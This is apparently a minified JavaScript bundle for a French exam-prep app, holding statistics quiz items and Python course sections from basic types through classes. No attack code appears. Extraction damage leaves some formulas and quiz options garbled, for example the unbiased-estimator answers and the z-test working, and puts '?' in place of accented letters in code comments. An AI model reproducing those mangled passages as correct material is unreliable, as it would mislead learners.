 heure ?`,o:["Loi binomiale","Loi normale","Loi de Poisson","Loi uniforme"],a:2,e:"C) Loi de Poisson. Elle modélise le nombre d'occurrences d'un événement rare dans un intervalle de temps donné."},{q:"Si X ∼ P(λ1 ) et Y   ∼ P(λ2 ) sont indépendantes, Z = X + Y suit :",o:["P(λ1 + λ2 )","P(λ1 λ2 )","une loi normale","aucune loi connue"],a:0,e:"A). Stabilité de la loi de Poisson par addition (vrai aussi pour deux lois normales indépendantes)."},{q:"Que signifie sans biais  pour un estimateur Tn de θ ?",o:["Tn = θ toujours","E(Tn ) = θ","V(Tn ) = 0","limn→∞ Tn = θ"],a:1,e:"B). En moyenne, l'estimateur donne la vraie valeur. La réponse D décrit un estimateur convergent."},{q:"Dans un test, la p-value est inférieure à α = 0,05. Que conclut-on ?",o:["On rejette H0","On accepte H0","On a forcément fait une erreur de 1","Le test n'est pas concluant"],a:0,e:"A). p-value < α : les données sont très improbables sous H0 , on la rejette (résultat significatif )."},{q:`Quel est l'estimateur sans biais de σ
                                         2 ?

      1 P`,o:["n   (Xi − X̄)2","n−1","√","X̄/n"],a:1,e:"B). Diviser par n sous-estime σ 2 (E(S 2 ) = n−1 2 n σ ) car X̄ est calculé sur l'échantillon ; on corrige par n − 1 (degrés de liberté)."},{q:"X ∼ N (10, 4). Que vaut P(X ≤ 12) ? (on donne Φ(1) = 0,8413, Φ(2) = 0,9772)",o:["0,5","0,8413","0,9772","0,1587"],a:1,e:"√ B). σ = 4 = 2 ; P(X ≤ 12) = Φ 12−10 2 = Φ(1) = 0,8413. (Piège : diviser par 4 au lieu de 2 donnerait Φ(0,5).)"},{q:"Soit X ∼ E(0,5). Que vaut E(X) ?",o:["0,5","2","4","0,25"],a:1,e:"B) 2. E(X) = 1/λ = 2 (et V(X) = 1/λ2 = 4)."},{q:"n = 100, x̄ = 20, σ = 5 connu. IC de la moyenne au niveau 95% ?",o:["[19,02; 20,98]","[15,1; 24,9]","[19,5; 20,5]","[18,04; 21,96]"],a:0,e:"A). Marge = 1,96 × √100 = 0,98, donc [20 − 0,98; 20 + 0,98]."},{q:"Laquelle de ces armations est vraie ?",o:["cov(X, Y ) = 0 ⇒ X, Y indépendantes","X, Y indépendantes ⇒ cov(X, Y ) = 0","V(X − Y ) = V(X) − V(Y ) si indépendantes","E(XY ) = E(X)E(Y ) toujours"],a:1,e:"B). La réciproque (A) est fausse ; C est fausse car V(X − Y ) = V(X) + V(Y ) ; D exige l'indépen- dance (ou au moins la non-corrélation)."},{q:"Xi i.i.d. d'espérance 10 et d'écart-type 4, n = 100. La loi approchée de X̄n est :",o:["N (10; 16)","N (10; 0,16)","N (10; 1,6)","N (10; 0,4)"],a:1,e:"B). TCL : X̄n ≈ N (µ, σ 2 /n) = N (10; 16/100). (L'écart-type est 0,4, la variance 0,16.)"},{q:"E(X) = 10, V(X) = 4. Majorer P(|X − 10| ≥ 6) par Tchebychev.",o:["1/9","1/3","2/3","0,5"],a:0,e:"A). P(|X − EX| ≥ ε) ≤ V(X)/ε2 = 4/36 = 1/9."},{q:"n = 64, x̄ = 52, σ = 8. Test de H0 : µ = 50 contre H1 : µ ̸= 50 au seuil 5%. Conclusion ?",o:["Z = 2 > 1,96 : on rejette H0","Z = 2 > 1,96 : on accepte H0","Z = 0,25 : on rejette H0","Z = 0,25 : on ne rejette pas H0"],a:0,e:"A). Z = 8/ 52−50 √ = 21 = 2, supérieur à 1,96 : rejet de H0 (p-value ≈ 0,0455)."},{q:"On a sxy = 6 et sx = 3. Le coecient directeur de la droite de régression de y en x est :",o:["2","0,5","18","3"],a:0,e:"A) 2. a = sxy /s2x = 6/3 = 2. Bonnes révisions et bon succès pour les concours ! 12. Explications Détaillées, Règles et Notions à Mémoriser 12.1 Explications des Méthodes Mathématiques [Résolution d'un Système Linéaire – Pivot de Gauss] Pour résoudre AX = B : 1. Écrire la matrice augmentée (A|B). 2. Utiliser des opérations sur les lignes (Li ← λLi + µLj ) pour obtenir une matrice échelonnée. 3. Interpréter le résultat :  Une ligne (0 0 . . . 0 | c) avec c ̸= 0 ⇒ Aucune solution (Système incompatible).  Autant de pivots que d'inconnues ⇒ Solution unique.  Moins de pivots que d'inconnues ⇒ Infinité de solutions (introduire des paramètres). [Probabilités Conditionnelles et Bayes]  Définitio"}],V2={id:Jf,name:Yf,color:Zf,sections:eh,quiz:nh},_2=Object.freeze(Object.defineProperty({__proto__:null,color:Zf,default:V2,id:Jf,name:Yf,quiz:nh,sections:eh},Symbol.toStringTag,{value:"Module"})),th="python",ih="Python",rh="#facc15",sh=[{id:"1.1",c:1,t:"Pourquoi Python ?",x:`❖ Définition
     Python est un langage de programmation     interprété, orienté objet et à typage dynamique.
     Créé par Guido van Rossum en 1991, il est aujourd'hui l'un des langages les plus utilisés au
     monde, notamment en Data Science, IA, et développement web.

     ★   Astuce Concours
     Les points essentiels à retenir pour le concours :
      Python est interprété (pas compilé comme C/C++)
      Python utilise l'indentation à la place des accolades
      Typage dynamique : pas besoin de déclarer le type des variables
      Tout en Python est un objet
      Python est multi-paradigme : impératif, fonctionnel, OOP`},{id:"1.2",c:1,t:"Versions et Syntaxe de base",x:`❍ Note
     Python 2 vs Python 3 :   toujours supposer Python 3 dans les concours.
     Différences importantes : print() est une fonction en Python 3, division entière avec //.

     ➣   Syntaxe
 1   # Commentaire sur une ligne
 2   """
 3   Commentaire
 4   multi - lignes ( docstring )
 5   """
 7   # Affichage
 8   print ( " Bonjour , Python ! " )
 9   print ( " Valeur : " , 42 , sep = " " , end = " \\ n " )
11   # Entr ? e utilisateur
12   nom = input ( " Entrez votre nom : " )           # retourne toujours une str
14   # Connaitre le type
15   print ( type (42) )          # < class ' int '>
16   print ( type (3.14) )        # < class ' float '>
17   print ( type ( " abc " ) )   # < class ' str '>

     2 | Types de Données et Variables`},{id:"2.1",c:2,t:"Types primitifs",x:`❖ Définition
     Python possède plusieurs types de données de base :
      int : entiers (taille illimitée en Python 3)
      float : nombres à virgule flottante (64 bits)
      bool : True ou False (sous-classe de int !)
      complex : nombres complexes (ex: 3+4j)
      str : chaînes de caractères (immuables)
      NoneType : la valeur None (équivalent de null)

     ➤   Exemple
 1   #   Types num ? riques
 2   a   = 10            # int
 3   b   = 3.14          # float
 4   c   = True          # bool ( True == 1 , False == 0)
 5   d   = 3 + 4j        # complex
 7   # Conversions ( casting )
 8   int (3.9)        # = > 3 ( tronque , ne arrondit pas )
 9   float (5)        # = > 5.0
10   str (42)         # = > "42"
11   bool (0)         # = > False
12   bool ( " " )     # = > False
13   bool ([])        # = > False
14   bool ( None )    # = > False
16   # Valeurs falsy : 0 , 0.0 , "" , [] , {} , set () , None

     ☞   Attention / Piège
 1   # bool est une sous - classe de int
 2   isinstance ( True , int ) # = > True
 3   True + True               # => 2
 4   True * 5                  # => 5
 6   #   Division   en   Python 3
 7   7   / 2    #   =>   3.5 ( division r ? elle )
 8   7   // 2   #   =>   3    ( division enti ? re )
 9   7   % 2    #   =>   1    ( modulo )
10   2   ** 10 #    =>   1024 ( puissance )`},{id:"2.2",c:2,t:"Variables et affectation",x:`2.2. VARIABLES ET AFFECTATION

     ➣   Syntaxe
 1   # Affectation simple
 2   x = 10
 3   x = " texte "   # le type peut changer ( typage dynamique )
 5   # Affectation multiple
 6   a, b, c = 1, 2, 3
 7   a, b = b, a     # ? change sans variable temporaire !
 9   #   Affectation augment ? e
10   x   += 5   # x = x + 5
11   x   -= 2
12   x   *= 3
13   x   //= 2
14   x   **= 2
16   # Variables globales
17   x = 10
18   def f () :
19       global x    # modifier une variable globale
20       x = 20

     ★   Astuce Concours
     Identité vs Égalité :
         == compare les valeurs
         is compare les identités (même objet en mémoire)
          is None est préféré à == None
 1   a   = [1 , 2 , 3]
 2   b   = [1 , 2 , 3]
 3   a   == b     # True ( m ? mes valeurs )
 4   a   is b     # False ( objets diff ? rents )
 6   a = b
 7   a is b      # True ( m ? me r ? f ? rence )`},{id:"2.3",c:2,t:"Chaînes de caractères (str)",x:`❖ Définition
     Les chaînes Python sont   immuables (on ne peut pas modifier un caractère directement). Elles
     supportent l'indexation et le slicing.

     ➣   Syntaxe
 1   s = " Python "
 3   # Indexation ( commence ? 0)
 4   s [0]   # 'P '
 5   s [ -1] # 'n ' ( dernier )
 6   s [ -2] # 'o '

                                                          2.3. CHAÎNES DE CARACTÈRES (STR)

 8   # Slicing     : s [ debut : fin : pas ]
 9   s [0:3] #     ' Pyt '
10   s [::2] #     ' Pto '
11   s [:: -1] #   ' nohtyP ' ( inverser )
12   s [2:]    #   ' thon '
14   # M ? thodes importantes
15   s . upper ()                  # ' PYTHON '
16   s . lower ()                  # ' python '
17   s . strip ()                  # enl ? ve espaces
18   s . split ( ' , ')            # d ? coupe en liste
19   ' , '. join ([ 'a ' , 'b ' ]) # 'a , b '
20   s . replace ( 'y ' , 'Y ') # remplacement
21   s . startswith ( ' Py ') # True
22   s . find ( ' th ')            # 2 ( -1 si absent )
23   len ( s )                     # 6

     ➤   Exemple F-strings (Python 3.6+)
 1   nom = " Ahmed "
 2   age = 22
 3   # f - string ( m ? thode moderne recommand ? e )
 4   print ( f " Bonjour { nom } , tu as { age } ans " )
 5   print ( f " R ? sultat : {2**10:.2 f } " ) # formatage
 7   # Anciennes m ? thodes
 8   print ( " Bonjour %s , tu as % d ans " % ( nom , age ) ) # style C
 9   print ( " Bonjour {} , tu as {} ans " . format ( nom , age ) )

     3 | Structures de Contrôle`},{id:"3.1",c:3,t:"Conditions (if / elif / else)",x:`➣ Syntaxe

 1   x = 15
 3   if x > 20:
 4        print ( " grand " )
 5   elif x > 10:
 6        print ( " moyen " )
 7   else :
 8        print ( " petit " )
10   # Op ? rateur ternaire ( expression conditionnelle )
11   resultat = " pair " if x % 2 == 0 else " impair "
13   # Op ? rateurs logiques : and , or , not
14   if x > 0 and x < 100:
15        print ( " entre 0 et 100 " )
17   # Cha ? nage de comparaisons ( unique ? Python )
18   if 0 < x < 100:       # ? quivalent au pr ? c ? dent !
19       print ( " entre 0 et 100 " )`},{id:"3.2",c:3,t:"Boucles",x:`3.2.1 Boucle for
     ➣   Syntaxe
 1   # It ? ration sur une s ? quence
 2   for i in range (5) :         # 0, 1, 2, 3, 4
 3        print ( i )
 5   for i in range (2 , 10 , 2) : # 2 , 4 , 6 , 8
 6       print ( i )
 8   # It ? ration sur une liste
 9   fruits = [ " pomme " , " poire " , " kiwi " ]
10   for fruit in fruits :
11        print ( fruit )
13   # Avec index : enumerate
14   for i , fruit in enumerate ( fruits ) :
15       print ( f " { i }: { fruit } " )
17   # It ? ration sur dict
18   d = { " a " : 1 , " b " : 2}
19   for cle , val in d . items () :

                                                                                     3.2. BOUCLES

20        print ( cle , val )
22   # zip : it ? rer sur plusieurs s ? quences
23   for x , y in zip ([1 ,2 ,3] , [4 ,5 ,6]) :
24       print (x , y )

3.2.2 Boucle while

     ➣   Syntaxe
 1   n = 10
 2   while n > 0:
 3       print ( n )
 4       n -= 1
 6   # break , continue , else
 7   for i in range (10) :
 8       if i == 5:
 9            break         # sort de la boucle
10       if i % 2 == 0:
11            continue      # passe ? l ' it ? ration suivante
12       print ( i )
14   # else sur for / while : ex ? cut ? si pas de break
15   for i in range (5) :
16        if i == 10:
17            break
18   else :
19        print ( " Pas de break ! " ) # sera affich ?

     ★   Astuce Concours
     Le else sur une boucle est exécuté   uniquement si la boucle se termine normalement (sans
     break). C'est une fonctionnalité unique à Python très testée en concours !

     4 | Structures de Données`},{id:"4.1",c:4,t:"Listes (list)",x:`❖ Définition
     Une liste est une séquence   ordonnée et mutable d'éléments hétérogènes. C'est la structure la
     plus utilisée en Python.

     ➣   Syntaxe
 1   # Cr ? ation
 2   lst = [1 , 2 , 3 , 4 , 5]
 3   lst2 = list ( range (10) )
 4   lst3 = [0] * 5                   # [0 , 0 , 0 , 0 , 0]
 6   # Acc ? s et   slicing ( comme str )
 7   lst [0]        # premier ? l ? ment
 8   lst [ -1]      # dernier ? l ? ment
 9   lst [1:4]      # sous - liste
11   # Modification
12   lst [0] = 99
13   lst [1:3] = [10 , 20]
15   # M ? thodes essentielles
16   lst . append (6)          # ajoute ? la fin
17   lst . insert (0 , 99)     # ins ? re ? l ' index 0
18   lst . remove (3)          # supprime la premi ? re occurrence de 3
19   lst . pop ()              # retire et retourne le dernier
20   lst . pop (0)             # retire et retourne l ' index 0
21   lst . sort ()             # tri en place
22   lst . sort ( reverse = True )
23   sorted ( lst )            # retourne une nouvelle liste tri ? e
24   lst . reverse ()          # inverse en place
25   lst . index (4)           # retourne l ' index de 4
26   lst . count (2)           # compte les occurrences
27   lst . extend ([7 ,8])     # concat ? ne
28   len ( lst )               # taille
30   # Test d ' appartenance
31   4 in lst      # True

     ➤   Exemple Compréhensions de listes
 1   # [ expression for element in iterable if condition ]
 2   carres = [ x **2 for x in range (10) ]
 3   # [0 , 1 , 4 , 9 , 16 , 25 , 36 , 49 , 64 , 81]
 5   pairs = [ x for x in range (20) if x % 2 == 0]

                                                                             4.2. TUPLES (TUPLE)

 7   # Compr ? hension 2 D
 8   matrice = [[ i * j for j in range (3) ] for i in range (3) ]
 9   # [[0 ,0 ,0] ,[0 ,1 ,2] ,[0 ,2 ,4]]`},{id:"4.2",c:4,t:"Tuples (tuple)",x:`❖ Définition
     Un tuple est une séquence   ordonnée et immuable. Plus rapide que les listes, utilisé pour des
     données constantes.

     ➣   Syntaxe
 1   t   =   (1 , 2 , 3)
 2   t   =   1, 2, 3          # parenth ? ses optionnelles
 3   t   =   (42 ,)           # tuple ? 1 ? l ? ment ( virgule obligatoire !)
 4   t   =   tuple ([1 ,2 ,3]) # depuis une liste
 6   # Acc ? s comme les listes
 7   t [0] , t [ -1]
 9   # Unpacking
10   a, b, c = t
11   premier , * reste = (1 , 2 , 3 , 4 , 5)
12   # premier =1 , reste =[2 ,3 ,4 ,5]
14   # Named tuples ( collections )
15   from collections import namedtuple
16   Point = namedtuple ( ' Point ' , [ 'x ' , 'y ' ])
17   p = Point (3 , 4)
18   p .x , p . y # 3 , 4

     ☞   Attention / Piège
 1   # Un tuple ? un seul ? l ? ment DOIT avoir une virgule
 2   t1 = (42)    # ce n ' est PAS un tuple , c ' est un int !
 3   t2 = (42 ,)  # c ' est bien un tuple
 4   type ( t1 )  # < class ' int '>
 5   type ( t2 )  # < class ' tuple '>`},{id:"4.3",c:4,t:"Dictionnaires (dict)",x:`❖ Définition
     Un dictionnaire est une collection de paires   clé:valeur, non ordonnée (Python < 3.7) puis
     ordonnée par insertion (Python 3.7+). Les clés sont uniques et immuables.

     ➣   Syntaxe
 1   # Cr ? ation
 2   d = { " nom " : " Ahmed " , " age " : 22}

                                                                           4.4. ENSEMBLES (SET)

 3   d = dict ( nom = " Ahmed " , age =22)
 5   # Acc ? s
 6   d [ " nom " ]              # " Ahmed "
 7   d . get ( " nom " )        # " Ahmed "
 8   d . get ( " ville " , " inconnu " ) # valeur par d ? faut
10   # Modification
11   d [ " age " ] = 23
12   d . update ({ " ville " : " Rabat " })
14   # Suppression
15   del d [ " age " ]
16   d . pop ( " nom " )           # retire et retourne
17   d . pop ( " x " , None )      # sans KeyError si absent
19   # M ? thodes
20   d . keys ()       #   dict_keys
21   d . values ()     #   dict_values
22   d . items ()      #   dict_items ( cl ? , valeur )
23   " nom " in d      #   True ( teste les cl ? s )
24   len ( d )
26   # Compr ? hension de dict
27   carre = { x : x **2 for x in range (5) }
28   # {0:0 , 1:1 , 2:4 , 3:9 , 4:16}

     ➤   Exemple defaultdict et Counter
 1   from collections import defaultdict , Counter
 3   # defaultdict : valeur par d ? faut automatique
 4   dd = defaultdict ( list )
 5   dd [ " a " ]. append (1) # pas de KeyError
 7   # Counter : compter des ? l ? ments
 8   c = Counter ( " abracadabra " )
 9   c . most_common (2) # [( ' a ', 5) , ( ' b ', 2) ]
11   texte = " le chat mange le poisson "
12   mots = Counter ( texte . split () )`},{id:"4.4",c:4,t:"Ensembles (set)",x:`❖ Définition
     Un ensemble est une collection   non ordonnée d'éléments uniques et hashables. Optimisé pour
     les tests d'appartenance.

     ➣   Syntaxe
 1   s = {1 , 2 , 3 , 4}
 2   s = set ([1 , 2 , 2 , 3])        # {1 , 2 , 3} ( doublons retir ? s )
 3   s = set ()                        # ensemble vide ({} cr ? e un dict !)

                                                                         4.4. ENSEMBLES (SET)

 5   # Op ? rations
 6   s . add (5)
 7   s . remove (3)            # KeyError si absent
 8   s . discard (3)           # pas d ' erreur si absent
10   #    Op ? rations math ? matiques
11   a    = {1 , 2 , 3 , 4}
12   b    = {3 , 4 , 5 , 6}
13   a    | b       # union : {1 ,2 ,3 ,4 ,5 ,6}
14   a    & b       # intersection : {3 ,4}
15   a    - b       # diff ? rence : {1 ,2}
16   a    ^ b       # diff ? rence sym ? trique : {1 ,2 ,5 ,6}
17   a    <= b      # sous - ensemble ?
19   # frozenset : ensemble immuable ( peut ? tre cl ? de dict )
20   fs = frozenset ([1 , 2 , 3])

     ➔     Résumé rapide Comparaison des structures
         Type        Ordonné      Mutable Doublons Indexable
         list        Oui          Oui      Oui             Oui
         tuple       Oui          Non      Oui             Oui
         dict        Oui (3.7+)   Oui      Clés non        Via clé
         set         Non          Oui      Non             Non
         frozenset   Non          Non      Non             Non

     5 | Fonctions`},{id:"5.1",c:5,t:"Définition et appel",x:`➣ Syntaxe

 1   def addition (a , b ) :
 2       """ Docstring : retourne la somme de a et b . """
 3       return a + b
 5   # Appel
 6   resultat = addition (3 , 5)       # => 8
 7   resultat = addition ( b =5 , a =3) # arguments nomm ? s
 9   # Valeurs par d ? faut
10   def saluer ( nom , message = " Bonjour " ) :
11       return f " { message } , { nom }! "
13   saluer ( " Ahmed " )                # " Bonjour , Ahmed !"
14   saluer ( " Ahmed " , " Salut " )    # " Salut , Ahmed !"

     ☞   Attention / Piège
 1   # PI ? GE CLASSIQUE : valeur par d ? faut mutable
 2   def ajouter (x , lst =[]) : # MAUVAIS !
 3        lst . append ( x )
 4        return lst
 6   ajouter (1)     # [1]
 7   ajouter (2)     # [1 , 2] !!! ( m ? me liste r ? utilis ? e )
 9   # CORRECT :
10   def ajouter (x , lst = None ) :
11       if lst is None :
12             lst = []
13       lst . append ( x )
14       return lst

5.2 *args et **kwargs
  ➣ Syntaxe

 1   # * args : arguments positionnels variables ( tuple )
 2   def somme (* args ) :
 3        return sum ( args )
 5   somme (1 , 2 , 3 , 4)    # = > 10

                                                                         5.3. FONCTIONS LAMBDA

 7   # ** kwargs : arguments nomm ? s variables ( dict )
 8   def afficher (** kwargs ) :
 9        for cle , val in kwargs . items () :
10            print ( f " { cle } = { val } " )
12   afficher ( nom = " Ahmed " , age =22)
14   # Combinaison
15   def f (a , b , * args , ** kwargs ) :
16       print (a , b , args , kwargs )
18   f (1 , 2 , 3 , 4 , x =5 , y =6)
19   # 1 2 (3 , 4) { ' x ': 5 , 'y ': 6}
21   # D ? ballage lors de l ' appel
22   lst = [1 , 2 , 3]
23   somme (* lst )               # ? quivaut ? somme (1 , 2 , 3)
24   d = { " a " : 1 , " b " : 2}
25   f (** d )                    # ? quivaut ? f ( a =1 , b =2)`},{id:"5.3",c:5,t:"Fonctions lambda",x:`❖ Définition
     Une   lambda est une fonction anonyme à expression unique, définie en une ligne. Souvent utilisée
     avec map(), filter(), sorted().

     ➣   Syntaxe
 1   # lambda arguments : expression
 2   carre = lambda x : x **2
 3   addition = lambda a , b : a + b
 5   # Utilisation avec sorted
 6   etudiants = [( " Ali " , 18) , ( " Sara " , 22) , ( " Omar " , 20) ]
 7   etudiants . sort ( key = lambda x : x [1]) # tri par note
 9   # Utilisation avec map et filter
10   nombres = [1 , 2 , 3 , 4 , 5]
11   carres = list ( map ( lambda x : x **2 , nombres ) )
12   pairs = list ( filter ( lambda x : x %2==0 , nombres ) )
14   # reduce
15   from functools import reduce
16   produit = reduce ( lambda a , b : a *b , nombres )         # 120`},{id:"5.4",c:5,t:"Portée des variables (LEGB)",x:`5.4. PORTÉE DES VARIABLES (LEGB)

     ◆   Concept clé
     La règle   LEGB définit l'ordre de résolution des noms :
          Local : intérieur de la fonction courante
          Enclosing : fonctions englobantes (closures)
          Global : niveau module
          Built-in : fonctions Python natives

     ➤   Exemple Closures
 1   def compteur () :
 2       n = 0                       # variable de la closure
 3       def incrementer () :
 4           nonlocal n              # r ? f ? rence ? la variable englobante
 5           n += 1
 6           return n
 7       return incrementer
 9   c = compteur ()
10   c () # 1
11   c () # 2
12   c () # 3`},{id:"5.5",c:5,t:"Fonctions de haut ordre",x:`➤ Exemple

 1   # map ( fonction , iterable ) -> retourne un it ? rateur
 2   nombres = [1 , 2 , 3 , 4 , 5]
 3   doubles = list ( map ( lambda x : x *2 , nombres ) )
 4   # [2 , 4 , 6 , 8 , 10]
 6   # filter ( fonction , iterable ) -> filtre les ? l ? ments
 7   pairs = list ( filter ( lambda x : x %2==0 , nombres ) )
 8   # [2 , 4]
10   # zip ( iter1 , iter2 ) -> combine deux it ? rables
11   noms = [ " Ali " , " Sara " , " Omar " ]
12   notes = [15 , 18 , 12]
13   resultats = list ( zip ( noms , notes ) )
14   # [(" Ali " ,15) , (" Sara " ,18) , (" Omar " ,12) ]
16   # any () , all ()
17   any ([ False , True , False ])       # True
18   all ([ True , True , True ])         # True
19   all ([ True , False , True ])        # False
21   # sorted avec cl ? multiple
22   data = [( " Ali " , 3 , 18) , ( " Sara " , 1 , 20) , ( " Omar " , 2 , 18) ]
23   data . sort ( key = lambda x : ( x [2] , x [1]) ) # note puis rang

     6 | Itérateurs, Générateurs et Décorateurs`},{id:"6.1",c:6,t:"Itérateurs",x:`❖ Définition
     Un   itérable est un objet sur lequel on peut itérer (liste, tuple, str...). Un itérateur est un objet
     qui implémente __iter__() et __next__().

     ➣    Syntaxe
 1   lst = [1 , 2 , 3]
 2   it = iter ( lst )           #   cr ? e un it ? rateur
 3   next ( it )                 #   1
 4   next ( it )                 #   2
 5   next ( it )                 #   3
 6   next ( it )                 #   StopIteration !
 8   # Classe it ? rateur personnalis ? e
 9   class Compteur :
10       def __init__ ( self , max ) :
11           self . max = max
12           self . n = 0
13       def __iter__ ( self ) :
14           return self
15       def __next__ ( self ) :
16           if self . n >= self . max :
17                 raise StopIteration
18           self . n += 1
19           return self . n`},{id:"6.2",c:6,t:"Générateurs",x:`❖ Définition
     Un   générateur est une fonction qui utilise yield pour produire des valeurs à la demande (lazy
     evaluation). Très ecace en mémoire pour les grandes séquences.

     ➤    Exemple
 1   # Fonction g ? n ? ratrice
 2   def fibonacci () :
 3       a, b = 0, 1
 4       while True :
 5           yield a
 6           a, b = b, a + b
 8   fib = fibonacci ()
 9   for _ in range (8) :

                                                                                  6.3. DÉCORATEURS

10       print ( next ( fib ) , end = " " )
11   # 0 1 1 2 3 5 8 13
13   # Expression g ? n ? ratrice ( comme compr ? hension mais parenth ? ses )
14   gen = ( x **2 for x in range (1000000) ) # pas de m ? moire gaspill ? e
15   next ( gen ) # 0
16   next ( gen ) # 1
18   # send () et yield comme expression
19   def accumulateur () :
20       total = 0
21       while True :
22            val = yield total
23            total += val`},{id:"6.3",c:6,t:"Décorateurs",x:`❖ Définition
     Un   décorateur est une fonction qui prend une fonction en entrée et retourne une nouvelle fonction
     enrichie. Syntaxe : @decorateur.

     ➤    Exemple
 1   import time
 3   # D ? corateur de mesure du temps
 4   def chronometre ( func ) :
 5         def wrapper (* args , ** kwargs ) :
 6             debut = time . time ()
 7             resultat = func (* args , ** kwargs )
 8             fin = time . time ()
 9             print ( f " { func . __name__ } : { fin - debut :.4 f } s " )
10             return resultat
11         return wrapper
13   @chronometre
14   def calcul_long () :
15       sum ( range (10**6) )
17   calcul_long ()       # affiche le temps d ' ex ? cution
19   # D ? corateur avec param ? tres
20   def repeter ( n ) :
21         def decorateur ( func ) :
22             def wrapper (* args , ** kwargs ) :
23                 for _ in range ( n ) :
24                       func (* args , ** kwargs )
25             return wrapper
26         return decorateur
28   @repeter (3)
29   def dire_bonjour () :
30       print ( " Bonjour ! " )
32   dire_bonjour ()       # affiche 3 fois

                                                                          6.3. DÉCORATEURS

★   Astuce Concours
Décorateurs importants à connaître :
     @staticmethod : méthode statique (pas de self )
     @classmethod : méthode de classe (reçoit cls)
     @property : transforme une méthode en attribut
     @functools.wraps : préserve les métadonnées de la fonction

     7 | Gestion des Exceptions`},{id:"7.1",c:7,t:"Try / Except / Finally",x:`➣ Syntaxe

 1   try :
 2        x = int ( input ( " Entrez un nombre : " ) )
 3        resultat = 10 / x
 4   except ValueError :
 5        print ( " Ce n ' est pas un entier valide " )
 6   except ZeroDivisionError :
 7        print ( " Division par z ? ro ! " )
 8   except ( TypeError , OverflowError ) as e :
 9        print ( f " Erreur : { e } " )
10   except Exception as e :               # attrape tout
11        print ( f " Erreur inattendue : { e } " )
12   else :
13        print ( f " R ? sultat : { resultat } " ) # si pas d ' exception
14   finally :
15        print ( " Bloc toujours ex ? cut ? " )    # nettoyage

     ◆   Concept clé
     Hiérarchie des exceptions importantes :
          BaseException
             — Exception
                 * ValueError, TypeError, KeyError
                 * IndexError, ZeroDivisionError
                 * FileNotFoundError, IOError
                 * NameError, AttributeError
                 * RecursionError, MemoryError
             — KeyboardInterrupt
             — SystemExit

     ➣   Syntaxe Exceptions personnalisées
 1   class MonErreur ( Exception ) :
 2       def __init__ ( self , message , code = None ) :
 3           super () . __init__ ( message )
 4           self . code = code
 6   def valider_age ( age ) :
 7       if age < 0:
 8           raise MonErreur ( " L '? ge ne peut pas ? tre n ? gatif " , code =400)
10   try :
11       valider_age ( -5)
12   except MonErreur as e :
13       print ( f " Erreur { e . code }: { e } " )

                                                   7.2. GESTIONNAIRES DE CONTEXTE (WITH)`},{id:"7.2",c:7,t:"Gestionnaires de contexte (with)",x:`➣ Syntaxe

 1   # Fichiers
 2   with open ( " fichier . txt " , " r " , encoding = " utf -8 " ) as f :
 3       contenu = f . read ()
 4   # le fichier est automatiquement ferm ?
 6   # Gestionnaire personnalis ?
 7   class GestionRessource :
 8       def __enter__ ( self ) :
 9           print ( " Ouverture " )
10           return self
11       def __exit__ ( self , exc_type , exc_val , exc_tb ) :
12           print ( " Fermeture " )
13           return False # ne supprime pas les exceptions
15   with GestionRessource () as r :
16       pass
18   # contextlib
19   from contextlib import contextmanager
21   @contextmanager
22   def ma_ressource () :
23       print ( " Avant " )
24       yield " ressource "
25       print ( " Apr ? s " )
27   with ma_ressource () as r :
28       print ( f " Utilisation : { r } " )

     8 | Fichiers et Entrées/Sorties`},{id:"8.1",c:8,t:"Lecture et écriture de fichiers",x:`➣ Syntaxe

 1   #   Modes d ' ouverture
 2   #   'r ' : lecture ( d ? faut )
 3   #   'w ' : ? criture (? crase )
 4   #   'a ' : ajout en fin
 5   #   ' rb ' : lecture binaire
 6   #   'x ' : cr ? ation exclusive
 8   # Lecture compl ? te
 9   with open ( " data . txt " , " r " , encoding = " utf -8 " ) as f :
10       contenu = f . read ()                # tout en une str
12   with open ( " data . txt " ) as f :
13       lignes = f . readlines ()             # liste de lignes
15   with open ( " data . txt " ) as f :
16       for ligne in f :                      # ligne par ligne (? conomique )
17           print ( ligne . strip () )
19   # ? criture
20   with open ( " out . txt " , " w " ) as f :
21        f . write ( " Bonjour \\ n " )
22        f . writelines ([ " ligne1 \\ n " , " ligne2 \\ n " ])
24   # Fichiers CSV
25   import csv
26   with open ( " data . csv " ) as f :
27       reader = csv . DictReader ( f )
28       for row in reader :
29           print ( row [ " nom " ] , row [ " age " ])
31   # Fichiers JSON
32   import json
33   with open ( " data . json " ) as f :
34       data = json . load ( f )
36   with open ( " out . json " , " w " ) as f :
37       json . dump ( data , f , indent =2 , ensure_ascii = False )
39   # json . dumps / loads pour les cha ? nes
40   s = json . dumps ({ " nom " : " Ahmed " })
41   d = json . loads ( s )

           Part II
Programmation Orientée Objet

     9 | Classes et Objets`},{id:"9.1",c:9,t:"Définition d'une classe",x:`❖ Définition
     La POO en Python repose sur des     classes (modèles) et des objets (instances). Python est un
     langage entièrement orienté objet : tout est un objet.

     ➣   Syntaxe
 1   class Etudiant :
 2       # Attribut de classe ( partag ? par toutes les instances )
 3       etablissement = " Universit ? Hassan II "
 4       nombre_etudiants = 0
 6        def __init__ ( self , nom , age , note ) :
 7            """ Constructeur : initialise l ' instance """
 8            self . nom = nom             # attribut d ' instance
 9            self . age = age
10            self . note = note
11            Etudiant . nombre_etudiants += 1
13        def se_presenter ( self ) :
14            """ M ? thode d ' instance """
15            return f " Je suis { self . nom } , { self . age } ans , note : { self . note } "
17        @classmethod
18        def get_nombre ( cls ) :
19            """ M ? thode de classe """
20            return cls . nombre_etudiants
22        @staticmethod
23        def est_majeur ( age ) :
24            """ M ? thode statique : pas d ' acc ? s ? self ni cls """
25            return age >= 18
27        def __str__ ( self ) :
28            """ Repr ? sentation lisible """
29            return f " Etudiant ({ self . nom } , { self . age }) "
31        def __repr__ ( self ) :
32            """ Repr ? sentation d ? veloppeur """
33            return f " Etudiant ( nom ={ self . nom ! r } , age ={ self . age ! r }) "
35   # Utilisation
36   e1 = Etudiant ( " Ahmed " , 22 , 16)
37   e2 = Etudiant ( " Sara " , 21 , 18)
38   print ( e1 . se_presenter () )
39   print ( Etudiant . get_nombre () )          # 2
40   print ( Etudiant . est_majeur (20) )        # True

                                                             9.2. MÉTHODES SPÉCIALES (DUNDER)`},{id:"9.2",c:9,t:"Méthodes spéciales (Dunder)",x:`◆ Concept clé
     Les méthodes   dunder (double underscore) permettent de personnaliser le comportement des
     objets avec les opérateurs et fonctions Python.

     ➤   Exemple
 1   class Vecteur :
 2       def __init__ ( self , x , y ) :
 3           self . x = x
 4           self . y = y
 6        def __add__ ( self , other ) :      # v1 + v2
 7            return Vecteur ( self . x + other .x , self . y + other . y )
